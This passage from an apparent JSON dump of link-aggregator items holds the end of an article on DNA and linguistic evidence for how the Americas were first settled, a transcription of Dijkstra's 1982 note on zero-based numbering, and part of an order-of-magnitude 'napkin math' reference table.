sources. Then, they used phylogenetic algorithms to create a family tree of the forty languages, determining which were most closely related based on the number of similarities (such as phonemes that serve particular roles in the language’s grammar, for instance). ^\n\n\tMap of human migrations\n\n“Their tree confirmed that Yenesian and Na-Dene are related—and that Haida is not—but because these languages were carried by populations of humans that were moving over time, the lengths of branches in the tree also allowed Sicoli and Horton to weigh the odds of two different migration hypotheses. The first, proposed by many linguists, held that the source of both the Yenesian and Na-Dene languages was in Asia, with a subset of its speakers migrating across Beringia and bringing evolved versions of the language to North America. The second held that the source was in Beringia itself, with subsets of its speakers fanning out over both Siberia and North America. ^\n\n“The phylogenetic analysis, based on the degree of similarities between Yenesian and Na-Dene languages and within both groups, strongly supported the latter hypothesis—meaning that residents of communities as far apart as Central Siberia and the Great Plains share common ancestors, who likely lived in Beringia for an extended period of time. “Growing up, I’d look at maps showing migrations to the Americas, and they’d always just show arrows going in one direction: straight across from Asia to North America,” Sicoli says. “What we see now is something more complicated, because some of those arrows go back to Siberia, and it wasn’t a non-stop trip.” ^\n\n“This fits with what we know about the geography of the region at the time. Asia and Alaska were connected by a land bridge because global sea levels were much lower, largely because of how much water was locked up in glaciers that covered much more of the planet than today. But even though these glaciers opened up the corridor between North America and Asia, they also closed the door, because, as mentioned before, Alaska itself was under a thick sheet of ice at that time. Thus, the land bridge was a dead end, potentially explaining why these ancient migrants could have spent about 10,000 years in Beringia. Then, about 17,000 years ago, the glaciers began to recede—and sea levels began to rise—providing two reasons to leave Beringia, either for new territory in Alaska or back toward Siberia.”\n\n24,000-Year-Old Siberian DNA Suggests Native Americans More Closely Linked to Eurasians than East Asians\n\nMeeri Kim wrote in the Washington Post: “The genetic analysis of a 24,000-year-old arm bone from an ancient Siberian boy suggests that Native Americans have a more complicated ancestry than scientists realized, with some of their distant kin looking more Eurasian than East Asian.\nThe new study, published in the journal Nature, represents the oldest genome of a modern human ever fully sequenced. [Source:  Meeri Kim, Washington Post, November 20, 2013 ||+||]\n\n“Modern-day Native Americans share from 14 to 38 percent of their DNA with the Siberian hunter-gatherers — who are not closely related to East Asians — with the remainder coming from East Asian ancestors. Most scientists have thought that the first Americans came only from the East Asian populations. “If you read about the origins of Native Americans, it will say East Asians somehow crossed the Bering Sea,” said study author and evolutionary biologist Eske Willerslev at Copenhagen University. “This is definitely not the case — it’s more complex than that.” ||+||\n\n“It isn’t known where or when the meeting of the two peoples happened, but a likely location could be Beringia, the region surrounding the current gap between Alaska and Siberia. Although presently occupied by the Bering Strait and its surrounding waters, the glaciers of roughly 20,000 years ago locked up much of the earth’s water, exposing a land bridge between the two continents. The prehistoric crossroad provided an easy way for people, animals and plants to spread. ||+||\n\n“Originally excavated in the 1950s, the remains of the boy had been tucked away in the bowels of a museum in St. Petersburg. He was about 3 when he died, and he was buried with a variety of “grave goods,” including a swan figurine and an ivory pendant. When Willerslev sequenced the DNA from the boy’s upper arm bone, he thought the results were a mistake: It said the boy belonged to a lineage commonly found among Europeans, but not in East Asians. “We put the study on hold for a year because I thought it was contamination,” Willerslev said. They tried again, this time digging deeper and looking at the Y chromosome. It and the rest of the genome told the same story: The boy had links to present-day western Eurasians and Native Americans, but not East Asians. ||+||\n\n“They also sequenced a more recent Siberian adult whose DNA wasn’t as well preserved, and they got similar results. “They were members of a really cosmopolitan group that probably reflect early modern humans leaving Africa and spreading into central Asia,” said study author Kelly Graf, a Texas A&M anthropologist. Their results support fossil evidence from early Paleo-Indian humans, such as a well-preserved skeleton known as Kennewick man found in Washington state. Dated to about 9,000 years old, he has facial features that don’t look East Asian but rather somewhat Caucasian — a mystery found replicated in other skulls. ||+||\n\n“The fact that the first Americans were already mixed to begin with could answer these controversies, Willerslev said. Any Western Eurasian genetic signatures found in Native Americans today were previously attributed to post-1492 colonial mixing with Europeans. “Maybe it has much deeper roots — from Siberia, not Europeans coming over in their boats,” Graf said.” ||+||\n\n\tFrequency of distribution of the main mtDNA American haplogroups in native Americans\n\nSingle Wave Migration Theory Versus Multiple Pulses Theory for the First Americans\n\nThere are two theories about the migration process of the first American: 1) it was a single migratory event, the so called single wave theory,  or 2) it occurred in multiple pulses, waves or migrations. The evidence gathered so far seems to suggest it was a single event or at least a dominant single event, with some sideshow migrations that didn’t leave much of a DNA impact. Tests on mitochondrial DNA taken from the few examples of ancient American DNA, Joel Achenbach wrote in the Washington Post, “have a genetic marker common today across the Americas, one that scientists say evolved in a prehistoric population that had been isolated for thousands of years in Beringia, the land mass between Alaska and Siberia that formed a bridge between the continents during the Ice Ages. Thus, according to the report, the Native Americans and the Paleoamericans are the same people, descended from the same Beringia population. They just look different because of recent evolution. [Source: Joel Achenbach, Washington Post,  May 15, 2014]\n\n“Most scientists have assumed that the first humans to come to the Americas traveled from Eurasia across the Bering land bridge that existed before the oceans rose after the Ice Ages. But there is great debate about whether this represented a single migratory event or multiple pulses of people from different parts of Eurasia and via different routes, including a coastal migration. One maverick theory, based on archeological finds, contends that people came from Europe, following the edge of the ice around the North Atlantic.\n\n“Adding to the mystery is that the Paleoamericans, such as Naia, didn’t look like later Native Americans. Naia had a small, projecting face, with narrow cheekbones, wide-set eyes and a prominent forehead. Native Americans of later millennia tended to have broader, longer, flatter faces, and rounder skulls, said James Chatters, an independent researcher based in Washington state.\n\n See Separate Article:  SINGLE WAVE VERSUS MULTIPLE PULSE THEORY AND MIGRATION OF EARLY PEOPLE TO AMERICA  factsanddetails.com\n\nGenetic Links Between Early Americans and Early Japanese\n\nAileen Kawagoe wrote in Heritage of Japan: A 1994 study concluded that ancestral lineages of Ainu people migrated across Beringia carrying HTLV-I virus (subtype A) to the American continent in the Paleolithic era. Phlylogenetic analysis of mitochondrial DNA and HLA type analysis suggest there is a relationship between Japanese and Paleo-Indians in South America (DRB10802 was found to be present in almost all Amerindians, Siberian Eskimos and Japanese Ainu but specifically two Meso and South Amerindian DRB1 alleles – DRB10411 and DRB10417- are also shared with Siberians and Asian Pacific coast populations (Ainu, Japanese and Taiwan) as well as Athabaskans and Eskimos (other First American inhabitants) with the exception of the Aleuts). [Source: Aileen Kawagoe, Heritage of Japan website, heritageofjapan.wordpress.com]\n\n“A 2000 American Scientist article suggested that the “highest frequencies of these four haplogroups occur in the Altai Mountain/Tuva/Lake Baikal region, implying that this general region gave rise to the founders of Native American populations. Otherwise, haplogroup B is absent in the vast majority of native Siberian populations, haplogroup A occurs at very low frequencies outside of Chukotka, and haplogroups C and D are the predominant mtDNA lineages in northern Asia.\n\n“However, the presence of a certain control region mutation in haplogroups C and D may point to alternative source areas for ancestral Native Americans. This mutation appears in the majority of both haplogroup C and D mtDNAs in Native American populations, suggesting it is part of the original sequence motifs for both of them. Among all Asian and Siberian mtDNAs, however, this mutation only appears in haplogroup C mtDNAs from Mongolia and the Amur River region and in haplogroup D mtDNAs in the Japanese, Korean and Ainu. This distribution suggests that East Asia as well as southeast Siberia or Mongolia might be source areas or migration pathways for these haplogroups.\"\n\nAdachi N, and others in a study of “Mitochondrial DNA analysis of Jomon skeletons” assigned D1a (along with M7a, N9b) to ancient DNA recovered from 16 Jomon skeletons excavated from Funadomari site, Hokkaido, Japan. The fact that Hokkaido Jomons shared haplogroup D1 with Native Americans validates the hypothesized genetic affinity of the Jomon people to Native Americans, providing direct evidence for the genetic relationships between these populations… It appears that the genetic study of ancient populations in northern part of Japan brings important information to the understanding of human migration in northeast Asia and America. Adachi N, and others in “Mitochondrial DNA analysis of Jomon skeletons from the Funadomari site, Hokkaido, and its implication for the origins of Native American“, Am J Phys Anthropol. 2009 Mar;138(3):255-65. doi: 10.1002/ajpa.20923)]\n\n See Separate Article:  FIRST JAPANESE AND THEIR IMPACT ON THE AMERICAS  factsanddetails.com\n\n\tNative American DNA subrace genetic groups\n\nDNA Studies on the Relationship Between North and South Americans\n\nSome studies have suggested that the first Americans diverged genetically from their Siberian and East Asian ancestors about 25,000 years ago. These people traveled across the Bering Strait Land Bridge and eventually split into distinct North and South American populations. By about 13,000 years ago, people of the Clovis culture, known for its use of distinctive, pointy stone tools, came to occupy much of North America. But by this time, people were already living as far south as Monte Verde, Chile. They had been there since a least 14,500 years ago, according to archaeological findings there. Still it is not totally clear how the Clovis culture were linked to populations in South America. [Source:  Laura Geggel, Live Science, November 9, 2018]\n\nAccording to an ancient DNA analysis published online November 8, 2018 in the journal Cell prehistoric people from different populations made their way across the Americas thousands of years ago.  People genetically linked to the Clovis culture, one of the earliest and best-known cultures in North America, migrated into South America as far back as 11,000 years ago but then mysteriously disappeared around 9,000 years ago. The 2018 study says that another ancient group of people replaced them, but it is certain how or why this occurred, and the population turnover happened across the entire continent of South America.\n\nLaura Geggel wrote in Live Science: To unravel the genetic mysteries of the these ancient Americans, the researchers reached out to indigenous peoples and government agencies all over Central and South America, asking for permission to study the remains of ancient peoples that have been discovered over the years. In all, the international team of scientists was given permission to do genomewide analyses on 49 ancient people whose remains were unearthed in the following Central and South American countries: Belize, Brazil, Peru, Chile and Argentina. The oldest of these people lived about 11,000 years ago, marking this as a study that takes a big step forward from previous research, which only included genetic data from people less than 1,000 years old, the researchers said.\n\nTheir findings showed that DNA associated with the North American Clovis culture was found in people from Chile, Brazil and Belize, but only between about 11,000 to 9,000 years ago.\n\"A key discovery was that a Clovis culture-associated individual from North America dating to around 12,800 years ago shares distinctive ancestry with the oldest Chilean, Brazilian and Belizean individuals,\" study co-lead author Cosimo Posth, postdoctoral researcher of archaeogenetics at the Max Planck Institute for the Science of Human History in Germany, said in a statement. \"This supports the hypothesis that the expansion of people who spread the Clovis culture in North America also reached Central and South America.\" [In Photos: New Clovis Site in Sonora]\n\nCuriously, around 9,000 years ago, the Clovis lineage disappears, the researchers found. Even today, there is no Clovis-associated DNA found in modern South Americans, the researchers said. This suggests that a continentwide population replacement happened at that time, said study co-senior researcher David Reich, a professor of genetics at Harvard Medical School and a Howard Hughes Medical Institute investigator. Following this mysterious disappearance, there is a surprising amount of genetic continuity between people who lived 9,000 years ago and those living today in multiple South American regions, the researchers said.\n\nAlthough these findings shed light on early Americans, it's far from complete. The researchers acknowledge that they don't have human remains that are older than about 11,000 years old, \"and thus we could not directly probe the initial movements of people into Central and South America,\" they wrote in the study. Moreover, although the study looked at 49 people who lived between about 11,000 and 3,000 years ago, the research would be more comprehensive if more ancient individuals from different regions were included, the researchers said.\n\n\"We lacked ancient data from Amazonia, northern South America and the Caribbean, and thus cannot determine how individuals in these regions relate to the ones we analyzed,\" Reich said in the statement. \"Filling in these gaps should be a priority for future work.\"\n\n\tPacific Basin Human Geography migrations\n\nCalifornia-Peruvian Connection\n\nThe 2018 Cell study also revealed an unexpected connection between ancient people living in California's Channel Islands and the southern Peruvian Andes at least 4,200 years ago. It appears that these two geographically distant groups have a shared ancestry, the researchers found. [Source:  Laura Geggel, Live Science, November 9, 2018]\n\nLaura Geggel wrote in Live Science:  It's unlikely that people living in the Channel Islands actually traveled south to Peru, the researchers said. Rather, it's possible that these groups' ancestors sallied forth thousands of years earlier, with some ending up in the Channel Islands and others in South America. But those genes didn't become common in Peru until much later, around 4,200 years ago, when the population may have exploded, the researchers said.\n\n\"It could be that this ancestry arrived in South America thousands of years before and we simply don't have earlier individuals showing it,\" study co-lead researcher Nathan Nakatsuka, a research assistant in the Reich lab at Harvard Medical School, said in the statement. \"There is archaeological evidence that the population in the Central Andes area greatly expanded after around 5,000 years ago. Spreads of particular subgroups during these events may be why we detect this ancestry afterward.\"\n\nFirst Americans from Australia?\n\nInhabitants of what is now Australia travelled by canoe to settle in the Americans more than 30,000 years ago, some anthropologists have argues. Reuters reported: in 2004 They would have island hopped via Japan and Polynesia to the Pacific coast of the Americas at a time when sea levels were lower than they are today, Dr Silvia Gonzalez from John Moores University in Liverpool said annual meeting of the British Association for the Advancement of Science in Exeter in 2004. The claim will be unwelcome to today's native Americans who came overland from Siberia and say they were there first. Most researchers say they came across the Bering Straits from Russia to Alaska at the end of the Ice Age, up to 15,000 years ago. [Source: Reuters, September 7, 2004]\n\nBut Gonzalez said skeletal evidence pointed strongly to Australian origins and hinted that recovered DNA would corroborate it. \"This is very contentious,\" said Gonzalez. \"[Native Americans] cannot claim to have been the first people there.\" She said there was very strong evidence that the first migration came from Australia to the Pacific coast of America. Skulls of a people with distinctively long and narrow heads discovered in Mexico and California predated by several thousand years the more rounded features of the skulls of native Americans.\n\nOne particularly well preserved skull of a long-face woman had been carbon dated to 12,700 years ago, whereas the oldest accurately dated native American skull was only about 9000 years old.  She said there were tales from Spanish missionaries of an isolated coastal community of long-face people in Baja California, known as the Pericues, who were of a completely different race and rituals from other communities in America at the time. \"They appear more similar to southern Asians and the populations of the Pacific Rim than they do to northern Asians,\" she said. \"You cannot have two face shapes coming from the same place.\" The last survivors were wiped out by diseases imported by the Spanish conquerors, Gonzalez said.\n\nResearchers have ruled out the theory that the first Americans were Pacific Islanders who boated across the open ocean, because people didn't migrate to Polynesia until around 3,000 years ago and genetic evidence shows that the first Americans are only very distantly related to Polynesians. [Source:  Laura Geggel, Live Science, October 9, 2023]\n\n See Separate Article:  PEOPLE WHO LIVED AUSTRALIA 20,000 TO 10,000 YEARS AGO  factsanddetails.com\n\nThose That Argue That DNA Doesn’t Tell the Whole Story\n\nFen Montaigne wrote in Smithsonian magazine: “Some archaeologists, like Ben A. Potter at the University of Alaska Fairbanks, emphasize that genetics can only provide a road map for new digs, not solid evidence of the Beringian Standstill theory or the settlement of the Americas 20,000 years ago. “Until there’s actual evidence that people were in fact there, then it remains just an interesting hypothesis,” he says. “All that is required is that [ancestral Native Americans] were genetically isolated from wherever the East Asians happened to be around that time. There’s absolutely nothing in the genetics that necessitates the Standstill had to be in Beringia. We don’t have evidence that people were in Beringia and Alaska then. But we do have evidence that they were around Lake Baikal and into the Russian Far East.” [Source: Fen Montaigne, Smithsonian magazine, January-February 2020]\n\n“After Potter unearthed the 11,500-year-old remains of two infants and a girl at the Upward Sun River site in Alaska’s Tanana Valley — among the oldest human remains found in North America — Willerslev sequenced the infants’ DNA. The two scientists were co-authors on a Nature paper that “support[ed] a long-term genetic structure in ancestral Native Americans, consistent with the Beringian ‘standstill model.’”\n\n“But Potter thinks that news stories on these and other findings have been too definitive. “One of the problems with the media coverage is its focus on a single hypothesis — a pre-16,000-year-old migration along the northwest coast — that is not well supported with evidence.” Potter remains doubtful that humans could have survived in most of Beringia during the bitter peak of the ice age, about 25,000 years ago. “Across the board,” he says, “from Europe all the way to the Bering Strait, this far north area is depopulated. There’s nobody there, and that lasts for a long time.”\n\nImage Sources:  Wikimedia Commons\n\nText Sources: National Geographic, New York Times, Washington Post, Los Angeles Times, Smithsonian magazine, Nature, Scientific American. Live Science, Discover magazine, Discovery News, Ancient Foods  ancientfoods.wordpress.com ; Times of London, Natural History magazine, Archaeology magazine, The New Yorker, Time, Newsweek, BBC, The Guardian, Reuters, AP, AFP and other publications.\n\nLast updated June 2024",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "d6bb492b59d5a400",
    "title": {
      "en": "Numbering should start at zero (1982)",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://www.cs.utexas.edu/~EWD/transcriptions/EWD08xx/EWD831.html",
    "score": 103,
    "by": "checkyoursudo",
    "time": 1742549733,
    "content": "Why numbering\n        should start at zero\n\t\t\t\tTo denote the subsequence of natural numbers 2, 3, ..., 12 without the pernicious three dots, four conventions are open to us\n\n\t\t\t\t\t\ta)\n\n\t\t\t\t\t\t2 ≤ i < 13\n\n\t\t\t\t\t\tb)\n\n\t\t\t\t\t\t1 < i ≤ 12\n\n\t\t\t\t\t\tc)\n\n\t\t\t\t\t\t2 ≤ i ≤ 12\n\n\t\t\t\t\t\td)\n\n\t\t\t\t\t\t1 < i < 13\n\n\t\t\t\tAre there reasons to prefer one convention to the other? Yes, there are. The observation that conventions a) and b) have the advantage that the difference between the bounds as mentioned equals the length of the subsequence is valid. So is the observation that, as a consequence, in either convention two subsequences are adjacent means that the upper bound of the one equals the lower bound of the other. Valid as these observations are, they don't enable us to choose between a) and b); so let us start afresh.\n\t\t\t\tThere is a smallest natural number. Exclusion of the lower bound —as in b) and d)— forces for a subsequence starting at the smallest natural number the lower bound as mentioned into the realm of the unnatural numbers. That is ugly, so for the lower bound we prefer the ≤ as in a) and c). Consider now the subsequences starting at the smallest natural number: inclusion of the upper bound would then force the latter to be unnatural by the time the sequence has shrunk to the empty one. That is ugly, so for the upper bound we prefer < as in a) and d). We conclude that convention a) is to be preferred.\n\t\t\t\tRemarkThe programming language Mesa, developed at Xerox PARC, has special notations for intervals of integers in all four conventions. Extensive experience with Mesa has shown that the use of the other three conventions has been a constant source of clumsiness and mistakes, and on account of that experience Mesa programmers are now strongly advised not to use the latter three available features. I mention this experimental evidence —for what it is worth— because some people feel uncomfortable with conclusions that have not been confirmed in practice. (End of Remark.)\n\t\t\t\t**\n\t\t\t\t\t*\n\t\t\t\tWhen dealing with a sequence of length N, the elements of which we wish to distinguish by subscript, the next vexing question is what subscript value to assign to its starting element. Adhering to convention a) yields, when starting with subscript 1, the subscript range 1≤i<N+1; starting with 0, however, gives the nicer range 0≤ i<N. So let us let our ordinals start at zero: an element's ordinal (subscript) equals the number of elements preceding it in the sequence. And the moral of the story is that we had better regard —after all those centuries!— zero as a most natural number.\n\t\t\t\tRemarkMany programming languages have been designed without due attention to this detail. In FORTRAN subscripts always start at 1; in ALGOL 60 and in PASCAL, convention c) has been adopted; the more recent SASL has fallen back on the FORTRAN convention: a sequence in SASL is at the same time a function on the positive integers. Pity! (End of Remark.)\n\t\t\t\t**\n\t\t\t\t\t*\n\t\t\t\tThe above has been triggered by a recent incident, when, in an emotional outburst, one of my mathematical colleagues at the University —not a computing scientist— accused a number of younger computing scientists of \"pedantry\" because —as they do by habit— they started numbering at zero. He took consciously adopting the most sensible convention as a provocation. (Also the \"End of ...\" convention is viewed of as provocative; but the convention is useful: I know of a student who almost failed at an examination by the tacit assumption that the questions ended at the bottom of the first page.) I think Antony Jay is right when he states: \"In corporate religions as in others, the heretic must be cast out not because of the probability that he is wrong but because of the possibility that he is right.\"\n\n\t\t\t\t\t\tPlataanstraat 5\n\t\t\t\t\t\t\t5671 AL NUENEN\n\t\t\t\t\t\t\tThe Netherlands\n\n\t\t\t\t\t\t11 August 1982\n\t\t\t\t\t\t\tprof.dr. Edsger W. Dijkstra\n\t\t\t\t\t\t\tBurroughs Research Fellow\n\n\t\t\t\tTranscriber: Kevin Hely.\n\t\t\t\t\t\tLast revised on Fri, 2 May 2008.",
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "ab8a990f1ca06468",
    "title": {
      "en": "Napkin Math Tool",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://taylor.town/napkin-math",
    "score": 131,
    "by": "surprisetalk",
    "time": 1742224563,
    "content": "Napkin Math Tool\nQuantity\n\n0\nindividual person\n\n1\nnuclear family, small friend group, car pool, small team\n\n2\nextended family reunion, classroom, apartment building, small company\n\n3\nelementary school, village, large wedding, medium company office\n\n4\nlarge high school, small town, popular concert, large corporation office\n\n5\nmajor sports stadium, medium-sized city, large university, industry convention\n\n6\nlarge metropolitan area, small country, global company workforce\n\n7\nlarge urban area population, mid-sized country, global social media platform users\n\n8\nJapan's population, global corporation's customer base, global sport viewership\n\n9\nIndia or China's population, Facebook users, global television audience\n\n10\nworld population + historical population, estimated global internet users by 2030\n\n11\nestimated human historical total, ants on Earth, trees on Earth\n\n12\nestimated stars in the Milky Way, global annual digital information in bytes\n\nProbability\n\n-10\npractically impossible, every atom in your body quantum tunneling simultaneously one foot to the left\n\n-9\nastronomically unlikely, shuffling a deck and getting cards in perfect sequential order, specific molecular-level event\n\n-8\nnearly inconceivable, winning national lottery jackpot twice in a row with single tickets, specific quantum tunneling event\n\n-7\nvirtually impossible, same person being struck by lightning twice in a lifetime, specific major asteroid impact in a given year\n\n-6\nexceptionally uncommon, random person winning a specific state lottery, fatal reaction to a well-tested vaccine\n\n-5\nextremely rare, winning $100+ in a specific scratch-off lottery ticket, specific major earthquake occurring on a given day\n\n-4\nhighly improbable, winning a specific 4-digit lottery number, being struck by lightning in your lifetime\n\n-3\n0.1%, rare event, being dealt a royal flush in poker, dying in a car accident in a given year (US)\n\n-2\n1%, very unlikely, winning a specific raffle with 100 tickets, professional athlete having career-ending injury in a given game\n\n-1\n10%, moderate chance, rolling a 1 on a 10-sided die, rain in Seattle on a random day, minor side effect from medication\n\n0\n100%, absolute certainty, guaranteed outcome, mathematical proof, sunrise tomorrow, death eventually occurring\n\nTime (seconds)\n\n-9\nfastest computer operations\n\n-8\nlight traveling 3 meters, fastest electronic switching\n\n-7\nhigh-performance CPU clock cycle\n\n-6\nRAM memory access time, radar echo\n\n-5\nmodern computer instruction cycle, sound traveling 3.4 meters\n\n-4\nfastest human reflex, high-speed camera frame, computer memory access\n\n-3\ncomputer CPU cycle, camera flash duration, neuron firing\n\n-2\nfast eye movement, nerve impulse transmission, hummingbird wingbeat\n\n-1\ncamera shutter click, finger snap, lightning flash\n\n0\nheartbeat, eye blink, saying a short word\n\n1\ntaking a quick breath, typing a sentence, drinking a glass of water\n\n2\n1.7 min, microwaving a meal, brushing teeth thoroughly, waiting in a short line\n\n3\n16.7 min, cooking a meal, commuting to work, watching a sitcom episode\n\n4\n2.8 hr, watching a movie trilogy, cross-town drive, professional sports game\n\n5\n1.2 days, weekend getaway, binge-watching a TV season, transatlantic flight\n\n6\n11.6 days, two-week vacation, waiting for a passport, healing from minor surgery\n\n7\n3.8 months, college semester, pregnancy trimester, training for a marathon\n\n8\n3.2 years, undergraduate degree, Olympic cycle, presidential term\n\n9\n31.7 years, mortgage payoff, career span, generational shift\n\n10\n317 years, rise and fall of empires, scientific revolutions, industrial age\n\n11\n3,170 years, development of world religions, rise and fall of ancient civilizations\n\n12\n31,700 years, ice ages, evolution of human language, cave painting to quantum computing\n\nFrequency (hertz)\n\n-1\nearth rotation cycle, tide changes, circadian rhythm\n\n0\nhuman heartbeat, breathing cycle, clock second\n\n1\nslow typing speed, resting brain alpha waves, hummingbird wings\n\n2\nlowest musical note perception, fast typing, camera shutter\n\n3\ntelephone voice band, musical middle C (261.6 Hz), bee's wings\n\n4\nhighest musical notes, upper limit of human hearing (young adults)\n\n5\nbat echolocation, ultrasonic cleaning, medical imaging\n\n6\nAM radio transmissions, medical ultrasound imaging (1 MHz)\n\n7\nshortwave radio, MRI scanners, RFID systems\n\n8\nFM radio broadcast, aerospace communications\n\n9\nmicrowave ovens, mobile phones, GPS signals (1 GHz)\n\n10\nsatellite communications, wireless networks, microwave links\n\n11\nmillimeter-wave scanners, automotive radar, 5G communications\n\n12\ninfrared radiation, thermal imaging, fiber optic communications (1 THz)\n\nMoney (dollars)\n\n-2\npenny, small paper clip, individual grain of rice, single cotton ball, one sheet of paper, 1g of soil, single drop of fresh water\n\n-1\ntext message, small candy, plastic pen, rubber band pack, paper napkin, 1kg of sand, 1L of fresh water, handful of topsoil\n\n0\ncandy bar, song download, dollar store item, public transit ride, service tip, 1 cubic meter of air, small bundle of firewood\n\n1\nfast food meal, movie ticket, paperback book, basic streaming subscription, cocktail, 1 ton of raw limestone, small garden plot (1 sq meter)\n\n2\ndecent pair of shoes, week of groceries, nice dinner for two, monthly utility bill, entry-level headphones, 1 barrel of crude oil, 1 ton of coal, small pine tree\n\n3\none month's rent (some areas), budget laptop, domestic flights, basic furniture set, low-end bicycle, 1 acre of rural land, 1 ton of iron ore, small residential solar array\n\n4\nused car, year of in-state tuition, high-end appliances, budget wedding, luxurious vacation, 1 acre of arable farmland, small woodlot, 1 ton of copper ore\n\n5\nhome down payment, luxury car, four-year degree, small business startup, year's salary for mid-level professional, small local businesses, pre-seed startups, 1 ton of refined copper, small natural gas well, 10 acres of forest land\n\n6\nhouse in most cities, retirement fund, small business acquisition, exotic supercars, multiple college educations, seed-stage startups, small local chains, small oil well, 1 ton of silver ore, small quarry operation\n\n7\nmansion in premium location, medium-sized jet, multi-location business, minor league sports team, significant art collection, early-stage startups, regional businesses, medium mining operation, small wind farm, 1 ton of gold ore\n\n8\nprivate island development, large business conglomerate, major market sports franchise, significant venture capital fund, feature film production, series B/C startups, medium-sized private companies, coal-fired power plant, small oil field, moderate hydroelectric dam\n\n9\nmajor sports teams, large commercial developments, significant philanthropic foundations, major research initiatives, large company ownership stakes, Instacart, Roblox, Reddit, large diamond mine, major forest reserve, all of a small country's lithium reserves\n\n10\nnational high-speed rail line, global tech platform, major airline group, significant portion of a major city, multiple global pharmaceutical companies, Airbnb, Snap, Uber, PayPal, large oil field, major hydroelectric project, 1% of global rare earth elements\n\n11\nlarge country's annual budget, global banking group, major tech ecosystem, comprehensive national infrastructure, international space program, Meta, Tesla, Alphabet, 10% of the world's copper reserves, all of Canada's timber, major river system\n\n12\nGDP of countries like Indonesia or Mexico, entire U.S. defense budget, ~5% of U.S. economy, nation-scale infrastructure overhaul, ~1/32 of U.S. national debt, Apple, Microsoft, Saudi Aramco, NVIDIA, all the world's extracted gold (~200,000 tons), all the world's copper reserves, Amazon rainforest\n\nDollars per day\n\n-1\npassive income from tiny investment, individual blog ad impression\n\n0\nsmall app subscription, basic streaming service, candy machine\n\n1\nentry-level gig work, small creator tips, coffee shop regular\n\n2\nminimum wage job, side hustle, small rental income\n\n3\nsuccessful professional, small business, popular creator income\n\n4\nsuccessful small business, local restaurant, medical practice\n\n5\nregional retailer, medium business, successful startup\n\n6\nmajor franchise, large corporation division, popular e-commerce site\n\n7\nFortune 500 company, major sports team, large hospital system\n\n8\ntech giant, major bank, global retail chain\n\n9\nglobal conglomerate, major stock exchange, oil company\n\n10\ntop global corporations combined, large national tax revenue\n\n11\nmajor economy GDP, global payment networks, global industry sector\n\n12\nlargest global economies combined, world financial system\n\n13\nworld economy, planetary scale economic activity\n\nDays per $1000\n\n-4\nseconds\nmicro-transaction processor fees, penny stock day trading\n\n-3\nminutes\nhourly wage of high-earner, fast food restaurant hourly sales\n\n-2\nhours\nminimum wage day's work, small coffee shop daily revenue\n\n-1\ndays\nentry-level weekly salary, independent contractor daily rate\n\n0\nweeks\naverage monthly rent payment, typical car payment\n\n1\nmonths\nbudget smartphone lifetime cost, basic appliance over useful life\n\n2\nyears\nlifetime utility of basic furniture, depreciation of budget used car\n\n3\ndecades\nrural housing in developing regions, subsistence farming annual yield\n\n4\ncenturies\nmedieval craftsman lifetime earnings, ancient agricultural output\n\n5\nmillennia\nearly bronze age village production, paleolithic community resources\n\nDollars per kilogram\n\n-1\nbulk sand, gravel, raw earth, tap water\n\n0\ncoal, industrial salt, raw agricultural products (wheat, rice)\n\n1\nbulk steel, basic plastics, flour, cement\n\n2\nbasic electronics components, processed foods, common household goods\n\n3\nconsumer electronics, quality clothing, specialty foods\n\n4\nhigh-end smartphones, designer clothing, quality tools\n\n5\nprofessional equipment, luxury fashion, fine jewelry\n\n6\nindustrial machinery, medical devices, rare materials\n\n7\nadvanced scientific instruments, satellite components, fine art\n\n8\nrare earth elements, pharmaceutical APIs, specialized aerospace materials\n\n9\nmedical radioisotopes, cutting-edge semiconductor materials, precious gems\n\n10\nresearch-grade antimatter, certain advanced pharmaceuticals, rare isotopes\n\n11\nartificially produced super-heavy elements, experimental materials\n\nKilograms per dollar\n\n-11\nartificially produced super-heavy elements, experimental materials\n\n-10\nresearch-grade antimatter, certain advanced pharmaceuticals, rare isotopes\n\n-9\nmedical radioisotopes, cutting-edge semiconductor materials, precious gems\n\n-8\nrare earth elements, pharmaceutical APIs, specialized aerospace materials\n\n-7\nadvanced scientific instruments, satellite components, fine art\n\n-6\nindustrial machinery, medical devices, rare materials\n\n-5\nprofessional equipment, luxury fashion, fine jewelry\n\n-4\nhigh-end smartphones, designer clothing, quality tools\n\n-3\nconsumer electronics, quality clothing, specialty foods\n\n-2\nbasic electronics components, processed foods, common household goods\n\n-1\nbulk steel, basic plastics, flour, cement\n\n0\ncoal, industrial salt, raw agricultural products (wheat, rice)\n\n1\nbulk sand, gravel, raw earth, tap water\n\nEnergy (Joules)\n\n-18\nenergy of a single DNA bond, quantum computing operation\n\n-14\nenergy to flip a transistor in modern CPU\n\n-10\nenergy to transmit one bit wirelessly, single nerve impulse\n\n-6\nenergy of a mosquito flying for one second, mechanical watch tick\n\n-3\nenergy to lift a paperclip 1 cm, honeybee wing flap\n\n0\nenergy to lift an apple one meter, energy in a French fry, smartphone tap\n\n1\nenergy of a slap, burning a match, smart watch charging for one minute\n\n2\nenergy of a strong punch, AA battery, phone screen energy used per hour\n\n3\nfood calories in a bite of apple, bicycle movement for ten seconds, boiling a cup of water\n\n4\nfood calories in a candy bar, car movement for one second, toaster use for one minute\n\n5\nenergy to heat a gallon of water, laptop energy use per day, microwave heating a meal\n\n6\ndaily food intake for an adult, smartphone battery for a year, car moving at highway speed\n\n7\nenergy in 1 liter of gasoline, household electricity for a day, lightning bolt\n\n8\nenergy to launch a small rocket, household electricity for a week, small meteorite impact\n\n9\nenergy in 30 gallons of gasoline, home energy use for a month, small tornado\n\n10\nenergy released in a barrel of oil, residential electricity for a year, small earthquake\n\n11\nenergy in a lightning storm, fuel for a cross-country flight, medium earthquake\n\n12\nsmall nuclear bomb, daily electricity for a small city, large hurricane\n\n13\nmoderate nuclear explosion, monthly energy for a small city, major earthquake\n\n14\nlarge nuclear explosion, annual energy consumption of a small town, volcanic eruption\n\n15\nlarge meteor impact, daily solar energy reaching small country, hydrogen bomb\n\nPower (Watts)\n\n-18\nsingle enzyme reaction, quantum tunneling event\n\n-15\nbacterial flagellar motor, molecular computation\n\n-12\nsingle neuron at rest, RFID tag in passive mode\n\n-9\nelectronic watch operation, insect brain, ultra-low-power sensor\n\n-6\nhearing aid, pacemaker, IoT sensor in sleep mode\n\n-3\nsmart watch in standby, Bluetooth headset, 